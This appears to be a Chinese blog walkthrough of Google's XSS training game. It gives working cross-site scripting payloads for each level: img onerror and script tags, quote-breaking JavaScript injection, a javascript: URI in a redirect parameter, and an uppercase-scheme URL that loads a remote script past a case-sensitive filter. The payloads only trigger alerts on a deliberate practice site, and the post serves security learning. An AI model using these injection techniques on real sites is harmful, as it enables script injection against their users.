---
layout: post
title: google xss game 通关攻略
date: 2019-01-12
modified: 2019-01-12
categories: 
- 

tags:
- 翻译
---

<!-- # google的xss游戏通关攻略 -->
## [『第一关』](https://xss-game.appspot.com/level1)
第一关是个非常脆弱的反射性xss攻击。向url或者form表单中注入xss代码都可以实现攻击。把下面的俩例子粘贴到表单中，点击搜索按钮：
```html
<img src=x onerror="alert('xss')">
<script>alert("xss");</script>
```
<!-- more -->
如果把上面的俩例子注入到url中，点击go按钮（这个按钮是这个假浏览器的一部分），攻击可以生效。唯一的限制就是，如果拼接到url后面代码中包含一个分号，是不会起作用的。上面的第二个例子中，也可以省略分号，因为这script脚本只有一行。

但是，如果把分号用url编码成`%3B`,然后注入到url中，也可以攻击生效。注意，还需要在攻击代码之前添加`?query=`。因此就是连接下面三个片段：
1. `https://xss-game.appspot.com/level1/frame`
2. `?query=`
3. `<script>alert("xss")%3B</script>`

那么完整的url就是：

```code
https://xss-game.appspot.com/level1/frame?query=<script>alert("xss")%3B</script>
```


## [『第二关』](https://xss-game.appspot.com/level2)
第二关是一个关于存储型的xss攻击。这一关的做了一些过滤，防止你直接注入`script`标签。但是img标签是可以用的。而img标签允许可以添加一些监听函数（比如可以增加`onerror`），这里面是包含js代码的。

```
<img src="x" onerror="alert('xss')">
```

一旦攻击代码通过表单提交，每次载入这个页面，我们的js代码就可以在用户的浏览器运行--或者任何人--只要他们访问了这个网页。这也是为什么存储型的xss比反射性的危害更大。

我没有找到一个直接向url中注入代码的方法。

## [『第三关』](https://xss-game.appspot.com/level3)
为了通过第三关，我只能使用Safari (10.0.3)，因为Firefox (51.0.1) and Chrome (55.0.2883.95)都阻止向url中注入一个空格，不管有没有进行url编码。我用下面的url在safari中成功通过第三关。
```
https://xss-game.appspot.com/level3/frame' onerror="alert('xss')"
```
但我还是想用firefox通过。所以我拷贝了safari中叫做level3的cookie。我做了一下的步骤：
1. 我设置safari使用Burp proxy。
2. 我用上面的方法通过第一关和第二关。
2. 我用上面的添加了攻击代码的url访问访问第三关。当alert()弹出的时候，游戏就会设置一个叫做level3的cookie。
1. 我复制了这三个cookie
    ```
    level1=f148716ef4ed1ba0f192cde4618f8dc5; level2=b5e530302374aa71cc3028c810b63641; level3=d5ce029d0680b3816a349da0d055fcfa;
    ```
下面的代码是如何在火狐和chrome的开发者工具的console窗口设置新的cookie
```
document.cookie="level3=d5ce029d0680b3816a349da0d055fcfa";
```

现在就可以在火狐或者Chrome中进入下一关。不像那个由这个游戏设置的cookie，我们自己手动设置的cookie在此次回话结束后就过期。所以，如果你现在关闭`xss- game.appspot.com`的标签页，再重新打开这个网页，就会发现无法到第四关。这是因为第三关的cookie在刚才回话结束后就失效了。因此，最好的办法是手动给cookie设置过期时间的`expire`属性。

```
document.cookie="level3=d5ce029d0680b3816a349da0d055fcfa;expires=' Fri, 22 July 2022 5:34:56 GMT'";
```
也可以像这样设置cookie的其他属性，这里关于`document.cookie`[说明][2]非常详细。
 
组装img的代码， 如果我使用单引号提前截断，就可以注入
https://xss-game.appspot.com/level3/frame#1' onerror="alert(1)"/>

## 『第四关』
我没做出来。我谷歌了一些答案，但是并没有得到预期的结果。最终，我发现，在这三个浏览器中，如果你把下面的字符串输入到表单中，然后点击「create button」按钮，它是可以生效的。
```
');alert();var b=('
```

但是，要想直接注入url中使攻击生效，你必须对攻击的字符串进行url编码：
```
%27%29%3Balert%28%29%3Bvar+b%3D%28%27
```

有很多网站可以替你做这些。但是他们有bug，不可信。最近，我开始使用一个在python2.7在默认包含的方法。

```python
>>> import urllib
>>> foo = "');alert();var b=('"
>>> urllib.quote_plus(foo)
'%27%29%3Balert%28%29%3Bvar+b%3D%28%27'
```

记住，在变量的赋值中，用双引号包裹攻击字符串。也不要忘记，移除python在输出结果外边的单引号。在python3中有轻微的不同。我在StackExchange.com的一个[答案][3]中学到了这个。

与第一关中的url拼接类似，我们需要向攻击的字符串中添加合适的变量名，以及在变量名之前添加`?`和变量名之后添加`=`。也就是说连接下面的几个部分:
1. `https://xss-game.appspot.com/level4/frame`
2. `?timer=`
3. `%27%29%3Balert%28%29%3Bvar+b%3D%28%27`

这样可以得到：
```code
https://xss-game.appspot.com/level4/frame?timer=%27%29%3Balert%28%29%3Bvar+b%3D%28%27
```

然后点击这个假的浏览器中的『go』按钮。

## [『第五关』](https://xss-game.appspot.com/level5)

为了通过这一关，需要按照以下的步骤：
1. 点击『sign up』链接。
2. 在下一页，url会变成这样：

   ```code
   https://xss-game.appspot.com/level5/frame/signup?next=confirm
   ```
  
   在url中把`next`的值从`confirm`变成`javascript:alert(1)`。
3. 点击假浏览器中的『go』按钮。点击这个按钮可以改变『Next >>』的`href`连接的地址。在点击『go』按钮之前，如果把鼠标悬浮到『Next >>』上，目标地址是：

   ```code
   https://xss-game.appspot.com/level5/frame/confirm
   ```

   实际中，`href`的值相对路径连接，只是一个『confirm』。当把『confirm』变成`javascript:alert(1)`，url就被设置为：
   
   ```code
   https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(1)
   ```

   此时，点击『go』按钮，把鼠标悬浮到『Next >>』上，目标地址是：

   ```
   javascript:alert(1)
   ```
  
   用户手动编辑了url后，『href』的链接就变成用户的输入。
4. 点击『Next >>』链接，会显示一个弹出框，这个游戏会设置一个新的cookie，显示一个信息框，提示说你可以进入下一关。

我认为这个课程是说如果你不能注入标签，你也可以注入在真实的资源标识符前面添加`javascript:` 。我不得不点击所有四个提示，直到我按照提示4的连接[this IETF draft](https://tools.ietf.org/html/draft-hoehrmann-javascript-scheme-00)

## [『第六关』](https://xss-game.appspot.com/level6)

对于第六关，我得好好找找答案。实际上，这是一个客户端自定义的正则表达式的匹配过滤，这个过滤大小写敏感，过滤掉`http` or `https`开头的url。所以，一下是一个成功的url：

```
https://xss-game.appspot.com/level6/frame#HTTPS://xss.rocks/xss.js
```

我用了一个[xss.rocks][4]无害的js文件

我没有猜答案。我查看了源代码，看到在接下来的函数中阻止我注入`http`或者`https`.我也没把正则表达式拿来测试。我在 w3scholl.com ["Try It" page][5]测试js
字符串的match()方法.

这个函数可以再源代码的57行看到：
```javascript
      // This will totally prevent us from loading evil URLs!
      if (url.match(/^https?:\/\//)) {
        setInnerText(document.getElementById("log"),
          "Sorry, cannot load a URL containing \"http\".");
        return;
      }
```

其中的正则`/^https?:\/\//`可以匹配`http`或者`https`。如果开发者增加了i标记，这个正则就可以匹配大写或者小写。大小写不敏感的正则是`/^https?:\/\//i`。

我猜这一关的课主要是告诉你，应该浏览所有的源代码，看看开发者是不是写了客户端过滤的代码，看看他们是不是也犯错误。


[1]: https://xss-game.appspot.com/
[2]: https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie
[3]: http://stackoverflow.com/a/9345102
[4]: http://xss.rocks/
[5]: http://www.w3schools.com/jsref/tryit.asp?filename=tryjsref_match_regexp2

